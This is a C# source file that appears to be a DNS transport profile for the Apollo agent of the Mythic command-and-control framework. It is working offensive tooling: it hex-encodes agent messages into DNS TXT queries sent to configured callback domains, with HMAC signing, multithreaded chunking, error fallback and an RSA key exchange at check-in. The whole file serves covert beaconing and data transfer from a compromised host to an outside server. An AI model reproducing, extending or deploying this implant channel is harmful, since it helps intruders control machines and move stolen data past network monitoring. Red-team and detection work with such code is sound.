using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using ApolloInterop.Serializers;
using System.Net;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using ApolloInterop.Enums.ApolloEnums;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using DnsRip;

namespace DnsTransport
{
    public class DnsProfile : C2Profile, IC2Profile
    {
        private int server_turn = 2;
        private int agent_turn = 1;
        private int message_count_turn = 3;
        private int reset_turn = 4;
        private string cache_code = "";
        private string cached_message_server = "";
        private string cached_message_client = "";
        private int CallbackInterval;
        private int CallbackJitter;
        private bool EncryptedExchangeCheck;
        private string TerminateDate;
        private object lockerSend = new object();
        private object lockerErrorCount = new object();

        public object lockerDnsMsg = new object();
        private string InitializationMessagePrefix;
        private string DefaultMessagePrefix;
        private string HmacKey;

        public JsonSerializer aux_serial = new JsonSerializer();

        Dictionary<int, Thread> threads_msg = new Dictionary<int, Thread>();
        Dictionary<int, string> dns_msg = new Dictionary<int, string>();

        public volatile bool is_fallback = false;
        public volatile int error_count_p1 = 0;
        public volatile int error_count_p2 = 0;
        private int MAX_ERROR_TOLERANCE_1 = 50;
        private int MAX_ERROR_TOLERANCE_2 = 25;
        private volatile int max_threads_conn = 10;
        int[] next_msg_queue;
        Thread next_msg_organizer;

        private bool is_init = false;
        private bool finished_sending = false;
        private int message_count = 0;

        List<string> domains;
        private volatile int bit_flip = 0;
        DnsRip.Resolver dnsRip;
        private int channel;
        private int init_seq;
        private volatile int next_seq;
        private int end_seq;


        private bool _uuidNegotiated = false;

        public DnsProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            CallbackInterval = int.Parse(data["callback_interval"]);
            CallbackJitter = int.Parse(data["callback_jitter"]);
            InitializationMessagePrefix = data["msginit"];
            DefaultMessagePrefix = data["msgdefault"];
            HmacKey = data["hmac_key"];
            EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            // Necessary to disable certificate validation
            domains = data["callback_domains"].Split(',').ToList();
            this.next_msg_queue = new int[this.max_threads_conn];
            dnsRip = new DnsRip.Resolver(GetDnsAddress());
            reset_init_all();
            Agent.SetSleep(CallbackInterval, CallbackJitter);
        }

        public void reset_init_all()
        {
            this.error_count_p1 = 0;
            this.error_count_p2 = 0;
            this.finished_sending = false;
            this.bit_flip = 0;
            this.is_init = false;
            this.cached_message_client = "";
            this.cached_message_server = "";
            channel = initialize_ch_seq();
            init_seq = initialize_ch_seq();
            this.dns_msg.Clear();
            initialize_Channel_conn();

        }


        public void set_error()
        {
            lock (lockerErrorCount)
            {
                if (this.is_fallback == false)
                {
                    this.error_count_p1 += 1;
                }
                else
                {
                    this.error_count_p2 += 1;
                }
            }

        }

        public void reset_error_count()
        {
            lock (lockerErrorCount)
            {
                this.error_count_p1 = 0;
                this.error_count_p2 = 0;
                this.is_fallback = false;
                this.max_threads_conn = 10;
            }
        }

        public void set_fallback()
        {
            this.max_threads_conn = 1;
            this.is_fallback = true;

        }

        public void check_fallback()
        {
            if (this.is_fallback == true)
            {
                Thread.Sleep(this.CallbackInterval * 1000);
            }
        }


        //message pattern:
        //mesg    : _______.___________.________.________.__________
        //          PREFIX SID  +    SEQ BYTES   HMAC       DOMAIN
        //hmac = (md5) 32
        // seq + sid = 8
        //prefix = ~
        //domain = ~

        public string GetDnsAddress()
        {
            while (true)
            {
                NetworkInterface[] networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();

                foreach (NetworkInterface networkInterface in networkInterfaces)
                {
                    if (networkInterface.OperationalStatus == OperationalStatus.Up)
                    {
                        IPInterfaceProperties ipProperties = networkInterface.GetIPProperties();
                        IPAddressCollection dnsAddresses = ipProperties.DnsAddresses;

                        foreach (IPAddress dnsAdress in dnsAddresses)
                        {
                            if (dnsAdress.AddressFamily == AddressFamily.InterNetwork)
                            {
                                return dnsAdress.ToString();
                            }

                        }
                    }
                }
                Agent.Sleep();
            }
        }

        public int initialize_ch_seq()
        {
            Random rd_ch = new Random();
            return rd_ch.Next(0, 200);
        }

        public void initialize_Channel_conn()
        {
            while (is_init == false)
            {

                send_init_request();
                Agent.Sleep();
            }
        }

        public string get_random_domain_query()
        {
            var random = new Random();
            int index = random.Next(domains.Count);
            return domains[index];
        }

        public Dictionary<string, string> parse_message(string message)
        {

            string[] fields = message.Split('.');
            Dictionary<string, string> dFields = new Dictionary<string, string>();
            dFields["tsid"] = fields[0];
            dFields["bit_flip"] = fields[1];
            dFields["data"] = fields[2];

            return dFields;
        }

        public bool send_reset_request()
        {

            int maximum_size_messages = 63;
            string random_message = GenerateUniqueHexString(maximum_size_messages);
            string hex_channel = String.Format("{0:X2}", this.channel);
            string hex_seq = String.Format("{0:X6}", this.init_seq);

            var tsid = hex_channel + this.bit_flip + hex_seq;
            var data = Encoding.UTF8.GetBytes(tsid + random_message);
            var key = Encoding.UTF8.GetBytes(HmacKey);
            var hmac = new HMACMD5(key);
            var hashBytes = hmac.ComputeHash(data);
            string hmac_section = System.BitConverter.ToString(hashBytes).Replace("-", "").ToLower();


            string message = DefaultMessagePrefix + "." + tsid + "." + random_message + "." + hmac_section + "." + get_random_domain_query();


            string result = "";
            try
            {
                result = dnsRip.Resolve(message, DnsRip.QueryType.TXT).First().Record.Replace("\"", "");
            }
            catch (Exception ex)
            {
                set_error();
                result = "";

                return false;
            }

            try
            {
                if (!string.IsNullOrEmpty(result))
                {
                    Dictionary<string, string> dFields = parse_message(result);
                    int channel = int.Parse(dFields["tsid"].Substring(0, 2), System.Globalization.NumberStyles.HexNumber);
                    int seq = int.Parse(dFields["tsid"].Substring(2, 6), System.Globalization.NumberStyles.HexNumber);

                    if (channel != this.channel)
                    {
                        this.channel = channel;

                    }
                    this.bit_flip = this.agent_turn;
                    this.next_seq = seq;
                    this.init_seq = seq;
                    this.dns_msg.Clear();

                    reset_error_count();
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception ex)
            {
                result = "";
                return false;
            }
        }

        public void reset_cycle()
        {
            while (true)
            {
                check_fallback();
                if (send_reset_request() == true)
                {
                    break;
                }
                if (this.error_count_p2 >= this.MAX_ERROR_TOLERANCE_2)
                {
                    throw new Exception("Fallback");
                }
                if (this.error_count_p1 >= this.MAX_ERROR_TOLERANCE_1)
                {
                    set_fallback();
                }
            }

        }

        public void send_init_request()
        {
            int maximum_size_messages = 63;
            string random_message = GenerateUniqueHexString(maximum_size_messages);
            this.cache_code = random_message;
            string hex_channel = String.Format("{0:X2}", channel);
            string hex_seq = String.Format("{0:X6}", init_seq);

            var tsid = hex_channel + this.bit_flip + hex_seq;
            var data = Encoding.UTF8.GetBytes(tsid + random_message);
            var key = Encoding.UTF8.GetBytes(HmacKey);
            var hmac = new HMACMD5(key);
            var hashBytes = hmac.ComputeHash(data);
            string hmac_section = System.BitConverter.ToString(hashBytes).Replace("-", "").ToLower();

            string message = InitializationMessagePrefix + "." + tsid + "." + random_message + "." + hmac_section + "." + get_random_domain_query();

            string result = "";
            try
            {
                result = dnsRip.Resolve(message, DnsRip.QueryType.TXT).First().Record.Replace("\"", "");
            }
            catch (Exception ex)
            {
                result = "";
            }
            try
            {
                if (!string.IsNullOrEmpty(result))
                {
                    Dictionary<string, string> dFields = parse_message(result);
                    int channel = int.Parse(dFields["tsid"].Substring(0, 2), System.Globalization.NumberStyles.HexNumber);
                    int seq = int.Parse(dFields["tsid"].Substring(2, 6), System.Globalization.NumberStyles.HexNumber);

                    if (channel != this.channel)
                    {
                        this.channel = channel;

                    }


                    this.is_init = true;
                    this.bit_flip = this.agent_turn;
                    this.next_seq = seq;
                    this.init_seq = seq;
                }
            }
            catch (Exception ex)
            {
                result = "";
            }
        }


        public int get_maximum_size_dns(string prefix, string domain)
        {
            return (255 - prefix.Length - domain.Length - 32 - 8);
        }

        public List<string> SplitByLength(string str, int maxLength)
        {
            List<string> parts = new List<string>();
            for (int index = 0; index < str.Length; index += maxLength)
            {
                parts.Add(str.Substring(index, Math.Min(maxLength, str.Length - index)));
            }
            return parts;
        }


        public void setup_message_list(string message, string domain, bool is_cache)
        {
            IEnumerable<string> dns_msg_arr;
            //int maximum_size_messages = get_maximum_size_dns(sDefaultMessagePrefix, domain);
            int maximum_size_messages = 63;
            if (is_cache == false)
            {
                byte[] ba_str = Encoding.Default.GetBytes(message);
                var hexString = BitConverter.ToString(ba_str);
                hexString = hexString.Replace("-", "");
                dns_msg_arr = this.SplitByLength(hexString, maximum_size_messages);
            }
            else
            {
                dns_msg_arr = this.SplitByLength(message, maximum_size_messages);
            }
            int index = 0;
            foreach (var msg_chunk in dns_msg_arr)
            {
                this.dns_msg[index] = msg_chunk;
                index = index + 1;
            }
            this.end_seq = this.next_seq + this.dns_msg.Count;
            this.bit_flip = this.agent_turn;
        }

        public void add_packet(int seq, string packet)
        {
            lock (lockerDnsMsg)
            {

                int packet_pos = seq - this.init_seq;


                this.dns_msg[packet_pos] = packet;

                if (this.dns_msg.Count == this.message_count)
                {
                    this.bit_flip = this.reset_turn;
                }
            }
        }

        //send dns query using thread
        //mesg    : _______.___________.________.________.__________
        //          PREFIX SID  +    SEQ BYTES   HMAC       DOMAIN
        public void dnsquery(int seq, string domain, bool is_cache)
        {
            string result = "";
            try
            {
                string message;
                if (this.bit_flip == this.agent_turn)
                {
                    if (this.dns_msg.ContainsKey(seq - this.init_seq) && is_cache == false)
                    {
                        message = this.dns_msg[seq - this.init_seq];
                    }
                    else
                    {
                        if (is_cache == true)
                        {
                            message = this.dns_msg[0];
                        }
                        else
                        {
                            this.bit_flip = this.message_count_turn;
                            return;
                        }
                    }
                }
                else
                {
                    int maximum_size_messages = 63;
                    message = GenerateUniqueHexString(maximum_size_messages);
                }
                try
                {
                    string hex_channel = String.Format("{0:X2}", this.channel);
                    string hex_seq = String.Format("{0:X6}", seq);

                    var tsid = hex_channel + this.bit_flip + hex_seq;
                    var data = Encoding.UTF8.GetBytes(tsid + message);
                    var key = Encoding.UTF8.GetBytes(HmacKey);
                    var hmac = new HMACMD5(key);
                    var hashBytes = hmac.ComputeHash(data);
                    string hmac_section = System.BitConverter.ToString(hashBytes).Replace("-", "").ToLower();

                    string data_query = DefaultMessagePrefix + "." + tsid + "." + message + "." + hmac_section + "." + domain;
                    result = "";

                    result = dnsRip.Resolve(data_query, DnsRip.QueryType.TXT).First().Record.Replace("\"", "");
                }
                catch (Exception ex)
                {
                    result = null;
                }
                if (!string.IsNullOrEmpty(result))
                {

                    try
                    {
                        Dictionary<string, string> dFields = parse_message(result);
                        int resp_bit_flip = Int32.Parse(dFields["bit_flip"]);
                        if (resp_bit_flip == this.message_count_turn)
                        {
                            this.bit_flip = this.message_count_turn;
                            return;
                        }
                        if (resp_bit_flip == this.agent_turn || resp_bit_flip == this.server_turn)
                        {
                            int channel = int.Parse(dFields["tsid"].Substring(0, 2), System.Globalization.NumberStyles.HexNumber);
                            int seq_resp = int.Parse(dFields["tsid"].Substring(2, 6), System.Globalization.NumberStyles.HexNumber);

                            if (this.bit_flip == this.agent_turn)
                            {
                                if (this.next_seq < seq_resp)
                                {
                                    this.next_seq = seq_resp;
                                }
                                if (seq_resp >= this.end_seq)
                                {
                                    this.bit_flip = this.message_count_turn;
                                }
                                if (is_cache == true)
                                {
                                    this.bit_flip = this.message_count_turn;
                                    this.next_seq = this.end_seq;
                                }
                            }
                            else
                            {
                                if (Int32.Parse(dFields["bit_flip"]) == 2)
                                {
                                    if (dFields.ContainsKey("data") && !string.IsNullOrEmpty(dFields["data"]))
                                    {
                                        try
                                        {
                                            add_packet(seq_resp, dFields["data"]);
                                        }
                                        catch (Exception ex)
                                        {
                                            this.bit_flip = this.reset_turn;
                                        }
                                    }
                                }
                            }
                        }
                        if (Int32.Parse(dFields["bit_flip"]) == 4)
                        {
                            this.bit_flip = this.reset_turn;
                        }
                        reset_error_count();
                    }
                    catch (Exception ex)
                    {
                        result = "";
                    }
                }
                else
                {
                    set_error();
                }
            }
            catch (Exception ex)
            {
            }
        }

        public void setup_thread_reqs(int seq, string domain, bool is_cache)
        {
            if (this.bit_flip == this.agent_turn)
            {
                if (is_cache == true)
                {
                    dnsquery(seq, domain, is_cache);
                }
                else
                {
                    for (int i = 0; i < this.max_threads_conn && seq + i < this.end_seq && this.bit_flip == this.agent_turn; i++)
                    {
                        check_fallback();
                        Thread dnsthread = new Thread(() => dnsquery(seq + i, domain, is_cache));
                        dnsthread.Start();
                        threads_msg[i] = dnsthread;
                    }
                    for (int i = 0; i < max_threads_conn; i++)
                    {
                        threads_msg[i].Join();
                    }
                }
            }
            else
            {
                try
                {
                    for (int i = 0; i < this.next_msg_queue.Length && i < this.message_count && i < this.max_threads_conn && this.bit_flip == this.server_turn; i++)
                    {
                        check_fallback();
                        int new_start = seq + this.next_msg_queue[i];
                        Thread dnsthread = new Thread(() => dnsquery(new_start, domain, is_cache));
                        dnsthread.Start();
                        threads_msg[i] = dnsthread;
                    }
                    for (int i = 0; i < max_threads_conn; i++)
                    {
                        threads_msg[i].Join();
                    }
                }
                catch (Exception ex)
                {}
            }
        }

        public void send_dns_data(string domain, bool is_cache)
        {
            while (this.bit_flip == this.agent_turn)
            {
                if (this.error_count_p2 >= this.MAX_ERROR_TOLERANCE_2)
                {
                    throw new Exception("Fallback");
                }
                if (this.error_count_p1 >= this.MAX_ERROR_TOLERANCE_1)
                {
                    set_fallback();
                }
                int starting_point = this.next_seq;
                setup_thread_reqs(starting_point, domain, is_cache);
            }
        }
        public string GenerateUniqueHexString(int length)
        {
            string StringChars = "0123456789abcdef";
            Random rand = new Random();
            var charList = StringChars.ToArray();
            string hexString = "";

            for (int i = 0; i < length; i++)
            {
                int randIndex = rand.Next(0, charList.Length);
                hexString += charList[randIndex];
            }

            return hexString;
        }

        public void set_message_count(string domain)
        {
            while (this.bit_flip == this.message_count_turn)
            {
                check_fallback();
                //int maximum_size_messages = get_maximum_size_dns(sDefaultMessagePrefix, domain);
                string result = "";
                try
                {
                    int maximum_size_messages = 63;
                    string random_message = GenerateUniqueHexString(maximum_size_messages);

                    string hex_channel = String.Format("{0:X2}", channel);
                    string hex_seq = String.Format("{0:X6}", this.next_seq);

                    var tsid = hex_channel + this.bit_flip + hex_seq;
                    var data = Encoding.UTF8.GetBytes(tsid + random_message);
                    var key = Encoding.UTF8.GetBytes(HmacKey);
                    var hmac = new HMACMD5(key);
                    var hashBytes = hmac.ComputeHash(data);
                    string hmac_section = System.BitConverter.ToString(hashBytes).Replace("-", "").ToLower();

                    string data_query = DefaultMessagePrefix + "." + tsid + "." + random_message + "." + hmac_section + "." + domain;

                    result = dnsRip.Resolve(data_query, DnsRip.QueryType.TXT).First().Record.Replace("\"", "");
                }
                catch (Exception ex)
                {
                }
                //setup next x threads ( x = max_threads_conn)
                //
                if (!string.IsNullOrEmpty(result))
                {
                    Dictionary<string, string> dFields = parse_message(result);
                    int channel = int.Parse(dFields["tsid"].Substring(0, 2), System.Globalization.NumberStyles.HexNumber);
                    int seq_resp = int.Parse(dFields["tsid"].Substring(2, 6), System.Globalization.NumberStyles.HexNumber);

                    this.init_seq = seq_resp;
                    this.next_seq = 0;
                    this.message_count = int.Parse(dFields["data"], System.Globalization.NumberStyles.HexNumber);
                    this.bit_flip = this.server_turn;
                    this.end_seq = seq_resp + this.message_count;
                    this.dns_msg.Clear();
                    reset_error_count();
                }
                else
                {
                    set_error();
                    if (this.error_count_p2 >= this.MAX_ERROR_TOLERANCE_2)
                    {
                        throw new Exception("Fallback");
                    }
                    if (this.error_count_p1 >= this.MAX_ERROR_TOLERANCE_1)
                    {
                        set_fallback();
                    }
                }
            }
        }

        public void message_organizer()
        {
            //while (this.bit_flip == this.server_turn)
            //{
            //keep walking in the packets dictionary
            //until there is a gap
            //fill the next msg queue with the gap considering the maximum count of threads
            while (this.dns_msg.ContainsKey(this.next_seq) && this.next_seq < this.message_count)
            {
                this.next_seq = this.next_seq + 1;
            }

            for (int i = 0; i < max_threads_conn && this.bit_flip == this.server_turn; i++)
            {
                if ((this.next_seq + i) < this.message_count)
                {
                    this.next_msg_queue[i] = this.next_seq + i;
                }
                else
                {
                    this.next_msg_queue[i] = this.next_seq;
                }

            }
            //}
        }

        public void init_next_msg_queue()
        {
            for (int i = 0; i < next_msg_queue.Length; i++)
            {
                next_msg_queue[i] = i;
            }
        }

        public string get_dns_data(string domain, bool is_cache)
        {
            this.bit_flip = this.server_turn;
            init_next_msg_queue();
            //Thread msgorganizer_thread = new Thread(() => message_organizer());
            //msgorganizer_thread.Start();
            int starting_point = this.init_seq;
            while (this.bit_flip == this.server_turn)
            {
                //setup next x threads ( x = max_threads_conn)
                //
                if (this.error_count_p2 >= this.MAX_ERROR_TOLERANCE_2)
                {
                    throw new Exception("Fallback");
                }
                if (this.error_count_p1 >= this.MAX_ERROR_TOLERANCE_1)
                {
                    set_fallback();
                }
                try
                {
                    setup_thread_reqs(starting_point, domain, is_cache);
                }
                catch (Exception ex)
                {
                }
                message_organizer();
            }
            return build_message();
        }

        public static string HextoString(string InputText)
        {

            byte[] bb = Enumerable.Range(0, InputText.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(InputText.Substring(x, 2), 16))
                             .ToArray();
            return System.Text.Encoding.ASCII.GetString(bb);
        }

        public string build_message()
        {
            string full_msg = "";
            for (int i = 0; i < this.message_count; i++)
            {
                full_msg = full_msg + this.dns_msg[i];
            }
            if (full_msg == this.cache_code)
            {
                return full_msg;
            }
            full_msg = HextoString(full_msg);
            return full_msg;
        }


        public void Start()
        {
            bool first = true;
            while (Agent.IsAlive())
            {
                bool bRet = GetTasking(delegate (MessageResponse resp)
                {
                    return Agent.GetTaskManager().ProcessMessageResponse(resp);
                });

                if (!bRet)
                {
                    break;
                }

                Agent.Sleep();
            }
        }

        private bool GetTasking(OnResponse<MessageResponse> onResp)
        {
            return Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage msg)
            {
                return SendRecv<TaskingMessage, MessageResponse>(msg, onResp);
            });
        }

        public bool IsOneWay()
        {
            return false;
        }

        public bool Send<T>(T message)
        {
            throw new Exception("DnsProfile does not support Send only.");
        }

        public bool Recv<T>(OnResponse<T> onResponse)
        {
            throw new Exception("DnsProfile does not support Recv only.");
        }

        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
        {
            throw new NotImplementedException("DnsProfile does not support Recv only.");
        }

        public bool CompareMessages<T>(T message, TaskingMessage previous_message)
        {
            try
            {

                TaskingMessage new_message = (TaskingMessage)(object)message;
                if (new_message.GetTypeCode() != MessageType.TaskingMessage)
                {
                    return false;
                }
                if (previous_message.Equals(message))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception ex)
            { }
            return false;
        }


        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {

            string sMsg = "";
            string payload = "";
            bool is_cache = false;
            string auxMsg = aux_serial.Serialize(message);
            if (auxMsg == this.cached_message_client)
            {
                is_cache = true;
                sMsg = this.cache_code;
            }
            else
            {
                this.cached_message_client = auxMsg;
                sMsg = Serializer.Serialize(message);
            }
            string result;
            int busyCount = 0;
            string domain = get_random_domain_query();
            setup_message_list(sMsg, domain, is_cache);
            int count = 0;
            while (true)
            {
                try
                {
                    send_dns_data(domain, is_cache);
                    set_message_count(domain);
                    string enc_message = get_dns_data(domain, is_cache);//sent dns data, start receiving response
                    if (enc_message == this.cache_code)
                    {
                        result = this.cached_message_server;
                    }
                    else
                    {
                        result = enc_message;
                        this.cached_message_server = result;
                        onResponse(Serializer.Deserialize<TResult>(result));
                    }

                    reset_cycle();
                    break;
                }

                catch (Exception ex)
                {
                    if (this.error_count_p2 >= this.MAX_ERROR_TOLERANCE_2)
                    {
                        reset_init_all();
                    }
                    return false;
                }
            }
            //DebugWriteLine("Releasing egress mutex handle...");
            count = count + 1;
            return true;
        }

        // Only really used for bind servers so this returns empty
        public bool Connect()
        {
            return true;
        }

        public bool IsConnected()
        {
            return Connected;
        }

        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (EncryptedExchangeCheck && !_uuidNegotiated)
            {
                var rsa = Agent.GetApi().NewRSAKeyPair(4096);

                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = rsa.ExportPublicKey(),
                    SessionID = rsa.SessionId
                };

                if (!SendRecv<EKEHandshakeMessage, EKEHandshakeResponse>(handshake1, delegate (EKEHandshakeResponse respHandshake)
                {
                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    return true;
                }))
                {
                    return false;
                }
            }
            string msg = Serializer.Serialize(checkinMsg);
            return SendRecv<CheckinMessage, MessageResponse>(checkinMsg, delegate (MessageResponse mResp)
            {
                Connected = true;
                if (!_uuidNegotiated)
                {
                    ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                    _uuidNegotiated = true;
                }
                return onResp(mResp);
            });
        }

    }
}
